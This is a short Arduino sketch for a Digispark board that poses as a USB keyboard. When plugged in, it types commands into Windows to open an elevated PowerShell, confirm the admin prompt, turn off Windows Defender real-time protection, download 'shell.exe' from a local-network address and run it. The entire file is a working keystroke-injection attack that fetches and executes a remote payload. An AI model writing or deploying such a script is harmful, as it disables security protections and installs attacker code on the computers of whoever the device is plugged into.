// download and run an executable from server

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Set-MpPreference -DisableRea $true;$d = New-Object System.Net.WebClient;$f = '1.exe';$d.DownloadFile('http://192.168.0.24/shell.exe',$f);$e = New-Object -com shell.application; $e.shellexecute($f);");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  ExitShell();
  while(1);
}

void ExitShell()
{
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}
